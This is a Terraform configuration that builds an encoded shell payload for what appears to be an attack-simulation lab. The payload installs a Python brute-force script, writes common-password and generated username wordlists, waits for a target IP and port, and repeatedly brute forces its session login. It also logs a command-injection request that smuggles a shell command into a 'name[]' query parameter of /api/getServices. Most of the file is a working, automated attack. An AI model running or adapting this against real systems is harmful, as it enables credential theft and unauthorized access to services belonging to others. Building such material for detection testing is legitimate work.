locals {
    exploit_script = "bruteforce_session.py"
    attack_dir = "/authapp_attack"
    target_ip=var.inputs["target_ip"]
    target_port=var.inputs["target_port"]
    payload = <<-EOT
    log "cleaning app directory"
    rm -rf ${local.attack_dir}
    mkdir -p ${local.attack_dir}
    cd ${local.attack_dir}
    echo ${local.exploit} | base64 -d > ${local.exploit_script}
    echo ${local.requirements} | base64 -d > requirements.txt
    log "installing required python3.9..."
    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 jc
    log "installing exploit requirements..."
    python3.9 -m pip install --ignore-installed -r requirements.txt
    cat > /tmp/passwords.txt <<'EOF'
    123456
    123456789
    111111
    password
    qwerty
    abc123
    12345678
    password1
    1234567
    123123
    Hello World!
    EOF

    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "starting script..."
        log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.inputs["payload"]})'"
        log "checking target: ${local.target_ip}:${local.target_port}"
        while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
            log "failed check - waiting for target";
            sleep 30;
        done;
        log "target available - sending payload";
        sleep 5;
        
        # brute force the session password
        python3.9 ${local.exploit_script} --host=${local.target_ip} --port=${local.target_port} --password-list=/tmp/password.txt --output-password-list=/tmp/hydra-password.txt >/dev/null 2>&1 &

        # result is hydra-password list but we need a user list
        cat > /tmp/hydra-users.txt <<'EOF'
    clueburnetes
    clue_burnetes
    clue.burnetes
    clue-burnetes
    clue
    burnetes
    c.burnetes
    c_burnetes
    c-burnetes
    clueb
    clue_b
    clue.b
    clue-b
    burnetesclue
    burnetes_clue
    burnetes.clue
    burnetes-clue
    bclue
    b.clue
    b_clue
    b-clue
    burnetesc
    burnetes_c
    burnetes.c
    burnetes-c
    ClueBurnetes
    Clueburnetes
    CLUEBURNETES
    Clue_Burnetes
    CLUE_BURNETES
    Clue.Burnetes
    CLUE.BURNETES
    Clue-Burnetes
    CLUE-BURNETES
    Clue
    CLUE
    Burnetes
    BURNETES
    CBurnetes
    CBURNETES
    C.Burnetes
    C.BURNETES
    C_Burnetes
    C_BURNETES
    C-Burnetes
    C-BURNETES
    ClueB
    CLUEB
    Clue_B
    CLUE_B
    Clue.B
    CLUE.B
    Clue-B
    CLUE-B
    BurnetesClue
    BURNETESCLUE
    Burnetes_Clue
    BURNETES_CLUE
    Burnetes.Clue
    BURNETES.CLUE
    Burnetes-Clue
    BURNETES-CLUE
    BClue
    BCLUE
    B.Clue
    B.CLUE
    B_Clue
    B_CLUE
    B-Clue
    B-CLUE
    BurnetesC
    BURNETESC
    Burnetes_C
    BURNETES_C
    Burnetes.C
    BURNETES.C
    Burnetes-C
    BURNETES-C
    cburnetes
    EOF
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop"
            break
        else
            log "restarting loop..."
            log "waiting ${var.inputs["attack_delay"]} seconds...";
            sleep ${var.inputs["attack_delay"]}
        fi
    done
    log "Done."
    EOT


    exploit        = base64encode(file(
                                "${path.module}/resources/bruteforce_session.py", 
                            ))
    requirements        = base64encode(file(
                                "${path.module}/resources/requirements.txt", 
                            ))

    base64_payload = templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  ""
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = var.inputs["attack_delay"]
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}

